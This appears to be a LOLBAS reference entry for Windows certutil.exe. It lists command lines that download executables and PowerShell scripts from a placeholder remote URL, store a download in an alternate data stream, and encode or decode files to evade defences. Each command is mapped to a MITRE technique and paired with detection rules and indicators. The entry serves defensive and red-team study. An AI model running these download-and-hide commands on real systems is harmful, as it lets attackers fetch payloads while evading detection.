---
Acknowledgement:
- Handle: '@mattifestation'
  Person: Matt Graeber
- Handle: '@Moriarty_Meng'
  Person: Moriarty
- Handle: '@egre55'
  Person: egre55
- Person: Lior Adar
- Handle: '@hexacorn'
  Person: Adam
- Person: SomeTestLe
Author: Oddvar Moe
Commands:
- Category: Download
  Command: certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
  Description: Download and save an executable to disk in the current folder.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Download file from Internet
- Category: Download
  Command: certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
  Description: Download and save an executable to disk in the current folder when
    a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`
    when not.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Download file from Internet
- Category: ADS
  Command: certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
  Description: Download and save a .ps1 file to an Alternate Data Stream (ADS).
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Download file from Internet and save it in an NTFS Alternate Data Stream
- Category: Download
  Command: certutil.exe -URL {REMOTEURL:.exe}
  Description: Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Application: GUI
  Usecase: Download file from Internet
- Category: Encode
  Command: certutil -encode {PATH} {PATH:.base64}
  Description: Command to encode a file using Base64
  MitreID: T1027.013
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Encode files to evade defensive measures
- Category: Decode
  Command: certutil -decode {PATH:.base64} {PATH}
  Description: Command to decode a Base64 encoded file.
  MitreID: T1140
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Decode files to evade defensive measures
- Category: Decode
  Command: certutil -decodehex {PATH:.hex} {PATH}
  Description: Command to decode a hexadecimal-encoded file.
  MitreID: T1140
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Decode files to evade defensive measures
Created: 2018-05-25
Description: Windows binary used for handling certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml
- Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml
- Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml
- IOC: Certutil.exe creating new files on disk
- IOC: Useragent Microsoft-CryptoAPI/10.0
- IOC: Useragent CertUtil URL Agent
Full_Path:
- Path: C:\Windows\System32\certutil.exe
- Path: C:\Windows\SysWOW64\certutil.exe
Name: Certutil.exe
Resources:
- Link: https://twitter.com/Moriarty_Meng/status/984380793383370752
- Link: https://twitter.com/mattifestation/status/620107926288515072
- Link: https://twitter.com/egre55/status/1087685529016193025
- Link: https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/
mitre_data:
  technique_ids:
  - T1105
  - T1564.004
  - T1027.013
  - T1140
tags:
- lolbas/osbinaries
---

# Certutil.exe

Windows binary used for handling certificates

# Path(s)

- `C:\Windows\System32\certutil.exe`
- `C:\Windows\SysWOW64\certutil.exe`

# Decode Commands

Command to decode a Base64 encoded file.

```batch
certutil -decode {PATH:.base64} {PATH}
```

- **Usecase:** Decode files to evade defensive measures
- **Privileges Required:** User
- **MitreID:** `T1140`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Command to decode a hexadecimal-encoded file.

```batch
certutil -decodehex {PATH:.hex} {PATH}
```

- **Usecase:** Decode files to evade defensive measures
- **Privileges Required:** User
- **MitreID:** `T1140`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Encode Commands

Command to encode a file using Base64

```batch
certutil -encode {PATH} {PATH:.base64}
```

- **Usecase:** Encode files to evade defensive measures
- **Privileges Required:** User
- **MitreID:** `T1027.013`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# ADS Commands

Download and save a .ps1 file to an Alternate Data Stream (ADS).

```batch
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
```

- **Usecase:** Download file from Internet and save it in an NTFS Alternate Data Stream
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Download Commands

Download and save an executable to disk in the current folder.

```batch
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>` when not.

```batch
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>`.

```batch
certutil.exe -URL {REMOTEURL:.exe}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/Moriarty_Meng/status/984380793383370752
- https://twitter.com/mattifestation/status/620107926288515072
- https://twitter.com/egre55/status/1087685529016193025
- https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Matt Graeber (@mattifestation)
- Moriarty (@Moriarty_Meng)
- egre55 (@egre55)
- Lior Adar
- Adam (@hexacorn)
- SomeTestLe